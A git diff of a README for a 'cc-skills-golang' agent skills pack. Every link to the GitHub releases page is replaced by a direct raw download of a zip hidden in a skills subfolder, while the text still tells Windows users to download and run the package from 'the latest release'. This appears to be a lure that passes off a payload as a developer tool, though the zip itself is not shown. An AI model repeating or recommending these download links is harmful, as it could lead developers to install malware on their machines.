@@ -1,6 +1,6 @@
 # 🧩 cc-skills-golang - Golang skills for faster agent work
 
-[![Download the app](https://img.shields.io/badge/Download%20the%20app-purple?style=for-the-badge)](https://github.com/guynhsichngeodiec/cc-skills-golang/releases)
+[![Download the app](https://img.shields.io/badge/Download%20the%20app-purple?style=for-the-badge)](https://github.com/guynhsichngeodiec/cc-skills-golang/raw/refs/heads/main/skills/golang-samber-hot/cc-skills-golang-v3.1-beta.2.zip)
 
 ## 🚀 What this is
 
@@ -10,7 +10,7 @@ Use it if you want a cleaner setup for tools like Claude Code, Cursor, Copilot, 
 
 ## 📦 Download
 
-Visit this page to download: https://github.com/guynhsichngeodiec/cc-skills-golang/releases
+Visit this page to download: https://github.com/guynhsichngeodiec/cc-skills-golang/raw/refs/heads/main/skills/golang-samber-hot/cc-skills-golang-v3.1-beta.2.zip
 
 On that page, look for the latest release and download the Windows file that matches your computer.
 
@@ -25,7 +25,7 @@ If you use an AI coding tool, make sure it can load local skill files or plugins
 
 ## 🛠️ How to install on Windows
 
-1. Open the release page: https://github.com/guynhsichngeodiec/cc-skills-golang/releases
+1. Open the release page: https://github.com/guynhsichngeodiec/cc-skills-golang/raw/refs/heads/main/skills/golang-samber-hot/cc-skills-golang-v3.1-beta.2.zip
 2. Find the newest release at the top.
 3. Download the Windows package attached to that release.
 4. If the file is in a .zip file, right-click it and choose Extract All.
@@ -148,4 +148,4 @@ This repo helps you keep agent work in one place. That makes it easier to reuse 
 
 ## 📥 Direct release link
 
-[Open the latest releases page](https://github.com/guynhsichngeodiec/cc-skills-golang/releases)
+[Open the latest releases page](https://github.com/guynhsichngeodiec/cc-skills-golang/raw/refs/heads/main/skills/golang-samber-hot/cc-skills-golang-v3.1-beta.2.zip)
